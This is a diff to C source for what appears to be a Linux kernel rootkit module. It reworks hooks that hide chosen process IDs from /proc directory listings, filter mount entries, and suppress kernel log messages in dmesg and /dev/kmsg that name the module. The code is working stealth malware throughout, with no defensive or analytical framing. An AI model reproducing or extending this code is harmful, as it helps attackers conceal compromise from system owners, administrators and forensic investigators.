@@ -307,9 +307,8 @@ typedef int (*nvk_filldir_fn)(void *ctx, const char *name, int namlen,
 struct nvk_pid_hide_state {
 	int              pids[NVK_HIDE_PID_MAX];
 	int              count;
-	struct nvk_hook  filldir_hook;
+	struct nvk_hook_ctx ctx_hook;
 	int              active;
-	nvk_filldir_fn   orig_filldir;
 };
 
 static struct nvk_pid_hide_state _nvk_pid_state;
@@ -334,19 +333,42 @@ static int _nvk_pid_is_hidden(int pid)
 	return 0;
 }
 
-static int _nvk_filldir_filter(void *ctx, const char *name, int namlen,
-			       long long offset, u64 ino, unsigned int type)
+/*
+ * Context hook on proc_pid_readdir: intercepts the dir_context embedded
+ * filldir callback.  dir_context layout is { actor(fn ptr), pos(loff_t) }.
+ * X1 = struct dir_context *.  We wrap actor with our filter.
+ */
+static nvk_filldir_fn _nvk_pid_orig_actor;
+
+static int _nvk_pid_filldir_wrap(void *ctx, const char *name, int namlen,
+				 long long offset, u64 ino, unsigned int type)
 {
 	if (namlen > 0 && name[0] >= '1' && name[0] <= '9') {
 		int pid = _nvk_atoi(name, namlen);
 		if (pid > 0 && _nvk_pid_is_hidden(pid))
 			return 0;
 	}
-
-	if (_nvk_pid_state.orig_filldir)
-		return _nvk_pid_state.orig_filldir(ctx, name, namlen,
-						    offset, ino, type);
+	if (_nvk_pid_orig_actor)
+		return _nvk_pid_orig_actor(ctx, name, namlen,
+					   offset, ino, type);
 	return 0;
+}
+
+static void _nvk_pid_readdir_ctx(nvk_reg_ctx *ctx)
+{
+	unsigned long dir_ctx_ptr = ctx->regs[1];
+	if (!dir_ctx_ptr) return;
+
+	nvk_filldir_fn actor;
+	if (nvk_mem_read(&actor, (void *)dir_ctx_ptr, 8))
+		return;
+	if (!actor) return;
+	if (actor == (nvk_filldir_fn)_nvk_pid_filldir_wrap)
+		return;
+
+	_nvk_pid_orig_actor = actor;
+	nvk_filldir_fn wrap = _nvk_pid_filldir_wrap;
+	nvk_mem_write((void *)dir_ctx_ptr, &wrap, 8);
 }
 
 static int nvk_pid_hide_add(int pid)
@@ -384,10 +406,9 @@ static int nvk_pid_hide_install(void)
 		return 0;
 	}
 
-	int ret = nvk_hook_install(&_nvk_pid_state.filldir_hook,
-				   target,
-				   (void *)_nvk_filldir_filter,
-				   (void **)&_nvk_pid_state.orig_filldir);
+	int ret = nvk_hook_install_ctx(&_nvk_pid_state.ctx_hook,
+				       target, _nvk_pid_readdir_ctx,
+				       (void *)0);
 	if (ret) {
 		_nvk_pid_state.active = 1;
 		return ret;
@@ -406,8 +427,8 @@ static __always_inline int nvk_pid_should_hide(int pid)
 static void nvk_pid_hide_cleanup(void)
 {
 	if (!_nvk_pid_state.active) return;
-	if (_nvk_pid_state.filldir_hook.active)
-		nvk_hook_remove(&_nvk_pid_state.filldir_hook);
+	if (_nvk_pid_state.ctx_hook.base.active)
+		nvk_hook_remove_ctx(&_nvk_pid_state.ctx_hook);
 	_nvk_pid_state.active = 0;
 	_nvk_pid_state.count = 0;
 }
@@ -417,7 +438,6 @@ static void nvk_pid_hide_cleanup(void)
 
 typedef int (*nvk_mounts_show_fn)(void *seq, void *v);
 static struct nvk_hook _nvk_mounts_hook;
-static nvk_mounts_show_fn _nvk_orig_mounts_show;
 
 #define NVK_MOUNT_FILTER_MAX 8
 #define NVK_MOUNT_PATH_MAX   64
@@ -447,6 +467,15 @@ static int nvk_mount_filter_add(const char *path)
 	return 0;
 }
 
+static nvk_mounts_show_fn _nvk_orig_mounts_show_fn;
+
+static int _nvk_mounts_show_filter(void *seq, void *v)
+{
+	if (!_nvk_orig_mounts_show_fn)
+		return 0;
+	return _nvk_orig_mounts_show_fn(seq, v);
+}
+
 static int nvk_mount_filter_install(void)
 {
 	void *target;
@@ -457,6 +486,11 @@ static int nvk_mount_filter_install(void)
 	if (!target)
 		target = NVK_LOOKUP("show_mountinfo");
 	if (!target) return -1;
+
+	int ret = nvk_hook_install(&_nvk_mounts_hook, target,
+				   (void *)_nvk_mounts_show_filter,
+				   (void **)&_nvk_orig_mounts_show_fn);
+	if (ret) return ret;
 
 	_nvk_mnt_filter.active = 1;
 	return 0;
@@ -594,13 +628,8 @@ static int nvk_mod_vmalloc_filter(void)
 
 /* --- dmesg / kmsg log suppression --- */
 
-typedef int (*nvk_devkmsg_emit_fn)(int fac, int lvl, const char *fmt, ...);
-typedef int (*nvk_log_store_fn)(u32 caller, int fac, int lvl,
-				int fl, u64 ts, const char *dict,
-				size_t dlen, const char *text, size_t tlen);
-
-static struct nvk_hook _nvk_kmsg_hook;
-static int _nvk_kmsg_hooked;
+static struct nvk_hook_ctx _nvk_dmesg_ctx_hook;
+static int _nvk_dmesg_hooked;
 
 #define NVK_DMESG_FILTER_MAX 4
 #define NVK_DMESG_FILTER_LEN 32
@@ -647,46 +676,44 @@ static int _nvk_dmesg_should_suppress(const char *text)
 	return 0;
 }
 
-static nvk_devkmsg_emit_fn _nvk_orig_devkmsg_emit;
+static __attribute__((__noinline__)) long _nvk_dmesg_ret0(void) { return 0; }
 
-static int _nvk_devkmsg_emit_filter(int fac, int lvl,
-				    const char *fmt, ...)
+static void _nvk_dmesg_ctx_handler(nvk_reg_ctx *ctx)
 {
+	const char *fmt = (const char *)ctx->regs[2];
 	if (_nvk_dmesg_should_suppress(fmt))
-		return 0;
-	if (_nvk_orig_devkmsg_emit)
-		return _nvk_orig_devkmsg_emit(fac, lvl, fmt);
-	return 0;
+		ctx->force_jump = (u64)(unsigned long)_nvk_dmesg_ret0;
 }
 
 static int nvk_dmesg_suppress_install(const char *module_name)
 {
 	void *target;
 
-	if (_nvk_kmsg_hooked) return 0;
+	if (_nvk_dmesg_hooked) return 0;
 	if (!module_name) return -1;
 
 	nvk_dmesg_filter_add(module_name);
 
 	target = NVK_LOOKUP("devkmsg_emit");
 	if (!target)
+		target = NVK_LOOKUP("vprintk_emit");
+	if (!target)
 		target = NVK_LOOKUP("do_syslog");
 	if (!target) return -1;
 
-	int ret = nvk_hook_install(&_nvk_kmsg_hook, target,
-				   (void *)_nvk_devkmsg_emit_filter,
-				   (void **)&_nvk_orig_devkmsg_emit);
+	int ret = nvk_hook_install_ctx(&_nvk_dmesg_ctx_hook, target,
+				       _nvk_dmesg_ctx_handler, (void *)0);
 	if (ret) return ret;
 
-	_nvk_kmsg_hooked = 1;
+	_nvk_dmesg_hooked = 1;
 	return 0;
 }
 
 static void nvk_dmesg_suppress_cleanup(void)
 {
-	if (!_nvk_kmsg_hooked) return;
-	nvk_hook_remove(&_nvk_kmsg_hook);
-	_nvk_kmsg_hooked = 0;
+	if (!_nvk_dmesg_hooked) return;
+	nvk_hook_remove_ctx(&_nvk_dmesg_ctx_hook);
+	_nvk_dmesg_hooked = 0;
 	_nvk_dmesg_filter_cnt = 0;
 }
 
@@ -702,8 +729,28 @@ static int _nvk_kmsg_read_hooked;
 static long _nvk_kmsg_read_filter(void *filp, char __user *buf,
 				  size_t count, long long *ppos)
 {
+	long ret;
 	if (!_nvk_orig_kmsg_read) return -1;
-	return _nvk_orig_kmsg_read(filp, buf, count, ppos);
+
+	ret = _nvk_orig_kmsg_read(filp, buf, count, ppos);
+	if (ret <= 0 || !_nvk_dmesg_filter_cnt)
+		return ret;
+
+	if (_nvk_copy_from_user && _nvk_copy_to_user && ret < 512) {
+		char tmp[512];
+		unsigned long missed =
+			_nvk_copy_from_user(tmp, buf, (unsigned long)ret);
+		if (!missed) {
+			tmp[ret < 511 ? ret : 511] = '\0';
+			if (_nvk_dmesg_should_suppress(tmp)) {
+				if (ppos && *ppos >= ret)
+					*ppos -= ret;
+				return 0;
+			}
+		}
+	}
+
+	return ret;
 }
 
 static int nvk_kmsg_read_filter_install(void)
